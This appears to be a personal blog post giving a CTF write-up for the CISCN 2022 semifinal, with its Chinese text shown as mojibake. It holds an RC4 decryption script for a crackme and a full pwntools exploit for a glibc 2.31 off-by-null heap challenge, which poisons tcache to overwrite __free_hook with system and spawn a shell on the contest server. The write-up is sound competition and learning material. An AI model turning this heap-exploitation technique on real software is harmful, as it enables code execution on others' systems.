---
title : "ciscn2022 åä¸­èµ›åŒºå¤èµ›éƒ¨åˆ†wp"
layout: post
date: 2022-6-25
author: wsxk
comments: true
tags : [ctf_wp]
---

- [crackme2<br>](#crackme2)
- [mediumduck<br>](#mediumduck)
- [æ„Ÿæƒ³<br>](#æ„Ÿæƒ³)

## crackme2<br>
ç®€å•çš„rc4åŠ å¯†<br>
```python
key = list(b"happygame")
key_len = len(key)
cypherBytes = []
keyBytes = []
flag = []
encrypt=[0xCD,0x52,0x74,0x7A,0x1E,0x8,0x8,0xE0,0x57,0x3B,0x18,0x99,0xAF,0x3D,0x1D,0x94,0x15,0x25,0x67,0x5B,0x64,0x53,0x1F,0x3B,0xDC,0xA2,0x46,0x36,0xD3,0xFD,0xBE,0x33]
for i in range(256):
Â  Â  cypherBytes.append(i)
Â  Â  keyBytes.append(key[i%key_len])

jump = 0
for i in range(256):
Â  Â  jump = cypherBytes[i] + jump + keyBytes[i] & 0xFF
Â  Â  tmp = cypherBytes[i]
Â  Â  cypherBytes[i] = cypherBytes[jump]
Â  Â  cypherBytes[jump] = tmp
print(cypherBytes,keyBytes)

i=0
v3_2 =0
for x in range(32):
Â  Â  i = i+1&0xff
Â  Â  tmp = cypherBytes[i]
Â  Â  v3_2 = v3_2 + tmp + 0x88 & 0xFF
Â  Â  t = (cypherBytes[v3_2] + tmp & 0xFF)
Â  Â  cypherBytes[i] = cypherBytes[v3_2]
Â  Â  cypherBytes[v3_2] = tmp
Â  Â  flag.append(encrypt[x]^cypherBytes[t])

print(bytes(flag))
```

## mediumduck<br>
glibc2.31çš„off by nullé¢˜å‹(ä¸ªäººæ„Ÿè§‰è¿™æ¬¡å¤èµ›çš„é¢˜ç›®å…¨tmæ˜¯ç¼åˆæ€ªï¼Ÿ)<br>
å…ˆæ³„éœ²heapåŸºå€å’ŒlibcåŸºå€ ï¼Œç„¶åoverlapä¼ªé€ ä¸€ä¸ªå †å¹¶é‡Šæ”¾ï¼Œä½¿æˆ‘ä»¬æœ‰èƒ½åŠ›æ§åˆ¶tcacheé“¾è¡¨ï¼Œå°†tcacheé“¾è¡¨è®¾ç½®æˆfree_hookçš„åœ°å€ï¼Œ2.31å¹¶æ²¡æœ‰å¯¹æ­¤åšcheckï¼Œä½†æ˜¯è¦æ³¨æ„ä¸€ç‚¹çš„æ˜¯è¦é¢å¤–freeä¸€ä¸ªchunkï¼Œä½¿å¾—tcacheè®°è½½çš„chunkä¸º2ï¼Œå¦åˆ™ä¿®æ”¹é“¾è¡¨æ²¡æœ‰æ„ä¹‰ã€‚<br>
```python
from pwn import *
io=remote("10.75.1.25",58011)
#io= process("./pwn",env={"LD_PRELOAD":"./libc.so.6"})
#io= process("./pwn")
#libc = ELF("./libc.so.6")

libc = ELF("libc.so.6")
def add():
    io.sendlineafter("Choice: ",str(1))

def delete(index):
    io.sendlineafter("Choice: ",str(2))
    io.sendlineafter("Idx: ",str(index))

def show(index):
    io.sendlineafter("Choice: ",str(3))
    io.sendlineafter("Idx: ",str(index))

def edit(index,size,content):
    io.sendlineafter("Choice: ",str(4))
    io.sendlineafter("Idx: ",str(index))
    io.sendlineafter("Size: ",str(size))
    io.sendafter("Content: ",content)

for i in range(15):
    add()
for i in range(7): #put into tcache
    delete(i)
add()
show(0)
io.recvline()
heap_base = u64((io.recv(6)).ljust(8,b"\x00"))-0x7a0
log.success("heap_addr:"+hex(heap_base))
# pause()
delete(0)
delete(8)
delete(9)
delete(7)

for i in range(10):
    add()
for i in range(7):
    delete(i)
show(8)
io.recvline()
libc_base = u64((io.recv(6)).ljust(8,b"\x00"))-0x1ecb80-0x60
log.success("libc:"+hex(libc_base))
libc.address= libc_base

edit(7,0x20,p64(0)+p64(0x1f1)+p64(heap_base+0x9a0)+p64(heap_base+0x9a0))
edit(8,0xf8,b"a"*0xf0+p64(0x1f0))
delete(9)

for i in range(7):
    add()
add()#put 9 into tcache
delete(0)
delete(9)
edit(7,0x20,p64(0)+p64(0x100)+p64(libc.sym["__free_hook"])+p64(heap_base+0x10))
add()#0
add()#9 free_hook
edit(9,8,p64(libc.sym["system"]))
edit(0,8,b"/bin/sh\x00")
delete(0)
io.interactive()
```

## æ„Ÿæƒ³<br>
åŠå¹´å‰æ¥æ‰“æ¯”èµ›æ¯”ç°åœ¨åšå¾—å¤šï¼ˆğŸ˜‚ï¼Œè¿™é¢˜ç›®è´¨é‡ï¼ŒçœŸçš„æ˜¯ä¸å¥½è¯„ä»·ï¼Œpwné¢˜åªæœ‰heapï¼Œå…¶ä»–å•¥éƒ½æ²¡æœ‰ï¼‰
